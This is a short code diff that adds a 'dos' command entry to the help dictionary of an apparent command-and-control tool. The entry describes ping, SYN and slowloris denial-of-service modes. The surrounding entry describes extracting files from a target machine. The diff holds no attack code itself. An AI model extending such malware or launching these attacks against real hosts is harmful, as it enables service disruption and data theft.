@@ -355,7 +355,11 @@ class C2():
             'fileextractor' : {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'extract files with certain extensions or that match a regex from target machine',
-                'usage': 'fileextractor base_dir <extension/regex> args [-p]'}
+                'usage': 'fileextractor base_dir <extension/regex> args [-p]'},
+            'dos' : {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'start a DoS attack on a target host',
+                'usage': 'dos <start/stop/status> <ping/syn/slowloris> ip_addr [port] [-https]'}
         }
 
         try:
